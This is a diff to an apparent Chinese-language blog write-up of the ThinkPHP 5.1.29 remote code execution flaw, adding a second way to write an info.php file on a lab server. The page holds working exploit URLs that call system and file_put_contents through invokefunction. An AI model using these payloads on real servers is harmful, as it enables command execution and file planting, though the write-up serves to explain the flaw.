@@ -209,7 +209,10 @@ $controller       = strip_tags($result[1] ?: $this-&gt;rule-&gt;getConfig('defau
 <pre><code class="language-bash">http://tp.vsplate.me/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20'phpinfo();'</code></pre>
 <p><img src="/images/thinkphp-5.1.29/4.1.png" alt="" /></p>
 <p><strong>5. 写info.php文件</strong></p>
+<p>方法 1：</p>
 <pre><code class="language-bash">http://tp.vsplate.me/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20%27&lt;?php%20phpinfo();?&gt;%27%20&gt;%20info.php</code></pre>
+<p>方法 2：</p>
+<pre><code class="language-bash">http://tp.vsplate.me/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E</code></pre>
 <p>访问 info.php</p>
 <p><img src="/images/thinkphp-5.1.29/5.1.png" alt="" /></p>
 <h3>参考</h3>
